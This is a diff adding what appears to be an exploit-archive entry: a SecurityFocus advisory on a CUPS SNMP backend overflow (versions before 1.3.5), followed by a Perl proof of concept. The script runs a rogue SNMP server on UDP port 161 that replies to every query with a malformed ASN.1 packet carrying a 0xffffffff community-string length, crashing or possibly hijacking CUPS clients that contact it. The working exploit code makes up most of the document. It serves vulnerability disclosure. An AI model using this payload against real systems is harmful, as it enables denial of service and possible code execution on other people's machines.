@@ -1,0 +1,50 @@
+source: http://www.securityfocus.com/bid/26917/info
+
+Common UNIX Printing System (CUPS) is prone to a remote buffer-overflow vulnerability because the software fails to properly bounds-check user-supplied data before copying it to an insufficiently sized buffer.
+
+Exploiting this issue allows attackers to execute arbitrary machine code in the context of users running the affected software. Failed exploit attempts will likely result in denial-of-service conditions.
+
+This issue affects CUPS 1.2 and 1.3, prior to 1.3.5; other versions may also be vulnerable.
+
+P0C:
+===
+#!/usr/bin/perl
+#if 0
+# backend_snmp_poc.pl write by wei_wang@mcafee.com
+# 2007-11-06
+#
+# snmp.c asn1_get_string integer overflow cups 1.3.4
+#
+#    packet->error = "No community name";
+#  else if ((length = asn1_get_length(&bufptr, bufend)) == 0)
+#    packet->error = "Community name uses indefinite length";
+#  else
+#  {
+#    asn1_get_string(&bufptr, bufend, length, packet->community,
+#                    sizeof(packet->community));
+#
+#    if ((packet->request_type = asn1_get_type(&bufptr, bufend))
+#
+#002a: 30 38  tag=0x30 len=0x38
+#002c: 02 01 00                 version:1 (0)
+#002f: 04 84 ff ff ff ff 69 63       community:public
+#len is 0xffffffff
+#endif
+
+my $payload ="\x30\x38\x02\x01\x00\x04\x84\xff\xff\xff\xff\x41\x41";
+
+use strict;
+my $PF_INET=2;
+my $SOCK_DGRAM=2;
+my $port=161;
+my $proto=getprotobyname('udp');
+my $addres=pack('SnC4x8',$PF_INET,$port,0,0,0,0);
+my ($Cmd);
+socket(SOCKET,$PF_INET,$SOCK_DGRAM,$proto) or die "Can't build a socket";
+bind (SOCKET,$addres);
+while(1)
+{
+  my $rip=recv (SOCKET,$Cmd,100,0);
+  send (SOCKET,$payload,0,$rip) or die "send false";
+  print "$Cmd";
+}
